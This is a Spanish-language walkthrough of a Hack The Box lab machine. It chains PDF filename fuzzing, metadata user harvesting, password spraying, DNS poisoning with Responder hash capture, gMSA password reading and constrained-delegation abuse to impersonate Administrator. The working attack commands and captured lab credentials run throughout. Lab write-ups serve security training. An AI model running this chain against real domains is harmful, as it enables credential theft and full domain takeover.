Índice

  • Enumeración: Fuzzing del patrón de documentos web publicados
  • Explotación: Password Spray con usuarios extraídos de metadatos de PDFs y contraseña filtrada en un documento
  • Movimiento lateral: Share IT revela un script PowerShell; DNS malicioso y Responder capturan un hash NTLMv2
  • Movimiento lateral: ACL ReadGMSAPassword
  • Escalada de Privilegios: ACL AllowedToDelegate para impersonar Administrator

Enumeración

# Vemos en la web un patrón de ficheros para fuzzear

Fuzzear documentos

wfuzz -c --hc=404 -t 100 -w anos -w meses -w dias http://dc/documents/FUZZ-FUZ2Z-FUZ3Z-upload.pdf
# Vemos que existen muchos ficheros en el directorio

Explotación

Descargar todos los.pdf de la web

# One Liner
for year in {2019..2021}; do for month in {01..12};do for day in {01..31};do echo "http://10.129.95.154/documents/$year-$month-$day-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget

# Two Liner
for year in {2019..2021}; for month in {01..12}; for day in {01..31}; echo http://dc/documents/$year-$month-$day-upload.pdf >> urls

cat urls | xargs -n 1 -P 20 wget

Leer metadatos de los 100 pdfs y hacer lista de posibles usuarios

exiftool *.pdf | grep Creator | cut -d : -f2 | sort -u | sponge users

Convertir pdfs a txt para batearlos

# pdftotext file.pdf
ls | grep .pdf | xargs -n1  pdftotext

bat *.txt
# Contraseña: NewIntelligenceCorpUser9876

Password Spray

nxc smb dc -u users -p 'NewIntelligenceCorpUser9876' 

# [+] Tiffany.Molina:NewIntelligenceCorpUser9876

Movimiento lateral

IT share

smbclient //dc/IT/ -U Tiffany.Molina -c "recurse; prompt; mget *;"
# downdetector.ps1 -> Ejecuta cada 5 min una peticion con las credenciales de Ted.Graves a un DNS Record que comiencen por el nombre "web"

Añadir DNS Record al dominio

dnstool -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r webalvaro -a add -t A -d 10.10.16.69 10.129.95.154

Responder

responder -I tun0 -v

Crackear hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Credenciales -> Ted.Graves:Mr.Teddy

Movimiento lateral

Leer la contraseña GMSA

nxc ldap 10.129.95.154 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
# Credenciales -> svc_int$:d5538dca5ba2ff329c9df39ef130f439

Escalada de Privilegios

Enumerar SPN asociadas a servicios delegables con credenciales del dominio

pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.129.95.154 --full-data
# Usuario: svc_int
# AllowedToDelegateTo SPN: WWW/dc.intelligence.htb

Impersonar al usuario Administrator

impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -hashes :d5538dca5ba2ff329c9df39ef130f439 'intelligence.htb/svc_int$'

Exportar credenciales Administrator

export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

Acceso PSEXEC con Kerberos

impacket-psexec dc.intelligence.htb -k -no-pass
